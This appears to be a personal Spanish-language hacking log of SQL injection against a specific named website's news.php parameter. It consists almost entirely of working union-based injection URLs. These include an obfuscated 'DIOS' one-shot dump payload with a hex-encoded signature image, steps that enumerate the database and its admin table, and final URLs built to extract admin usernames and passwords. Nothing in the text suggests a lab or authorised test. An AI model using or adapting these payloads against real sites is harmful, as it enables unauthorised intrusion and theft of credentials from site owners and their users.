# Tutorial
````java
https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/Error%20Based%20SQLi/README.md
````
# Encoder
````java
https://codebeautify.org/string-hex-converter#
````

# Dork:
````java
http://math4all.in/news.php?id=6
````

# Vulnerabilidad:

````java
http://math4all.in/news.php?id=6'
````

# Existen 6 tablas: 
````java
http://math4all.in/news.php?id=6' order by 7-- -
````

# Mostrar tablas vulnerables: Opcion 1
````java
http://math4all.in/news.php?id=6' AND 0 Union Select 1,2,3,4,5,6-- -
````

# Mostrar tablas vulnerables: Opcion 2
````java
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,2,3,4,5,6--+-
````

- Se muestran 2 y 3 en pantalla, así que puedo usar cualquiera de las 2. 

# Usando 2 para DIOS
````java
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,>>>>DIOS<<<<,3,4,5,6--+-
````

## DIOS Fz3r0 - El chido: 
http://math4all.in/news.php?id=6  'AND 0 UNION SELECT 1,concat/*!(,0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,3,4,5,6--+-


## El chido pegado (espacios con %20 | ' con %27 )
http://math4all.in/news.php?id=6%27AND%200%20UNION%20SELECT%201,concat/*!(,0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,3,4,5,6--+-



# Encodeado completo DIOS
http://math4all.in/news.php?id=6%27%41%4e%44%20%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31,%63%6f%6e%63%61%74%2f%2a%21%,0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e3c62723e,%76%65%72%73%69%6f%6e%28%29%2c%28%53%65%6c%65%63%74%28%40%29%20%66%72%6f%6d%20%28%73%65%6c%65%63%54%28%40%3a%3d%30%78%30%30%29,%28%73%65%6c%65%63%74%28%30%29%20%66%72%6f%6d%20%28%2f%2a%21%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%53%63%68%65%6d%61%2a%2f%2e%63%6f%6c%75%6d%6e%73%29%20%77%68%65%72%65%20%28%74%61%62%6c%65%5f%53%63%68%65%6d%61%3d%64%61%74%61%62%61%73%65%28%29%29%61%6e%64%28%30%78%30%30%29%69%6e%28%40%3a%3d%63%6f%6e%63%61%74%2f%2a%21%28%40%2c%30%78%33%63%36%32%37%32%33%65%2c%74%61%62%6c%65%5f%6e%61%6d%65%2c%30%78%33%61%33%61%2c%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%29%29%29%29%78%29%29%2a%2f,%33%2c%34%2c%35%2c%36%2d%2d%20%2d












# Codificar HTML

se agrega el 0x al principio


<h1 style="color: red;">SQL Injection by Fz3r0</h1><h2 style="color: green;">DIOS hecho en Mexico</h2><h3 style="color: green;">El infierno es aqui merito...</h3><h3 style="color: green;">Esta vida y no chingaderas es el cabron infierno</h3>



<img src="https://raw.githubusercontent.com/Fz3r0/Fz3r0_-_BlackShark/main/Art/DIOS_Fz3r0_mini.png" class="img-responsive"><br>

0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e

3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e3c62723e

# firma unicamente encoding: 

,0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e

# Fz3r0 FULL DIOS:
concat/*!(,0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/



---

sacar a lmanita nombres y deas:

# Usando 2 para dump
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,>>>>dump<<<<,3,4,5,6--+-

# nombre base de datos
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,database(),3,4,5,6--+-

# name:
db_math4all

# db_math4all database into hex:
0x64625f6d61746834616c6c

# replace database name to hex:
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,0x64625f6d61746834616c6c,3,4,5,6--+-


---

Dump:

# sacando la columna, yo me concentraré en admin:

admin::id
admin::fname
admin::lname
admin::email
admin::contact
admin::username
admin::password

# admin a hex
0x61646d696e

# query
(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x61646d696e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e)

# Ahora solo rempazare el 2 o database() o lo que tenga, por el query
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x64625f6d61746834616c6c)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e),3,4,5,6--+-

# Approach 2
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x61646d696e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e),3,4,5,6--+-

# Approach 3
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x61646d696e)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x64625f6d61746834616c6c)))))x),3,4,5,6--+-


# Ya teniendo los datos


database: db_math4all
database: 0x64625f6d61746834616c6c

table: admin
table: 0x61646d696e

column: username
column: 

column: password
column: 

# query
(SELECT+GROUP_CONCAT(username+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin)


# username dump
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,(SELECT+GROUP_CONCAT(username+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin),3,4,5,6--+-

# password dump
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,(SELECT+GROUP_CONCAT(password+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin),3,4,5,6--+-

# All in one (2 y 3)
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,(SELECT+GROUP_CONCAT(username+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin),(SELECT+GROUP_CONCAT(password+SEPARATOR+0x3c62723e)+FROM+db_math4all.admin),4,5,6--+-

# admin user and password
